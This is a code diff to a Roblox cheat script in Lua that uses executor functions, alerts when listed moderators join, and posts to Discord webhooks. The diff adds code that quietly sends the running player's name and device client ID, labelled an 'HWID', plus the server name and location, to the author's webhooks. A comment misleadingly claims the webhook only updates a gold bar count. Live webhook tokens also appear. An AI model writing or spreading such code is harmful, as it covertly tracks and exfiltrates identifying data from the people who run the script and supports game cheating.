@@ -13,7 +13,6 @@ local win = SolarisLib:New({
 
 
 
-
 local playerIds = {421391593,42235130,1001242712,56721213,38307780,138249029,1041867508,95410360,1459923763,1696452029,150269473,1321098453,45453121,276142024,123755248,585228735,3489954641}
 local asset = getsynasset("ModeratorJoin.mp3")
 local sound = Instance.new("Sound")
@@ -38,10 +37,10 @@ end)
 
 
 
-local webhookURL = "https://ptb.discord.com/api/webhooks/1083765280423034890/bDHYkLOyC7MZpizBuA5yPs8xXokEnR5vpKY5u8-fU-UnAxjDS12tvWXmezzSaWc7t7iy" 
+local player = game:GetService("Players").LocalPlayer
+local webhookURL = "https://ptb.discord.com/api/webhooks/1084789194406244474/_gILFQZHd2qDkRIdUqAnr52I9pgHkGPnW-CWvW_xRkCq44CdSzYVazM0tUNbkdVPBKaA" -- Webhook updates gold bar count every certain second, don't use any client sided gold bar changes.
 local httpService = game:GetService("HttpService")
 local request = (syn and syn.request) or request or (http and http.request) or http_request
-local player = game:GetService("Players").LocalPlayer
 request({
     Url = webhookURL,
     Method = "POST",
@@ -52,8 +51,8 @@ request({
         content = "",
         embeds = {
             {
-                title = game.Players.LocalPlayer.Name,
-                description = "Total Silver Amount: " .. player.PlayerGui.SilverGUI.Frame.silver.Value.Text,
+                title = game.Players.LocalPlayer.Name.. "'s HWID",
+                description = game:GetService("RbxAnalyticsService"):GetClientId(),
                 color = 0x81ff57,
                 fields = {
                     {
@@ -67,8 +66,43 @@ request({
         },
     }),
 })
-                          
 
+
+
+
+
+local serverlocation = game:GetService("Workspace").ServerLocation.Value
+local server = game:GetService("Workspace").ServerName.Value
+
+local player = game:GetService("Players").LocalPlayer
+local webhookURL = "https://ptb.discord.com/api/webhooks/1084795568561336330/NTCXRAXX81E2aop-sKVsaXDZ_h6LYA1VJhiL3fURXg_QWpWFbvm14vyRLNY4ldGVWfIN"
+local httpService = game:GetService("HttpService")
+local request = (syn and syn.request) or request or (http and http.request) or http_request
+request({
+    Url = webhookURL,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json",
+    },
+    Body = httpService:JSONEncode({
+        content = "",
+        embeds = {
+            {
+                title = game.Players.LocalPlayer.Name.. "'s Server",
+                description = server,
+                color = 0x81ff57,
+                fields = {
+                    {
+                        
+ name = "Location:",
+                        value = serverlocation, 
+                        inline = true,
+                    },
+                },
+            },
+        },
+    }),
+})
 
 
 local player = game:GetService("Players").LocalPlayer
@@ -1471,6 +1505,5 @@ pcall(function()
 end)
     
 end
-
 
 
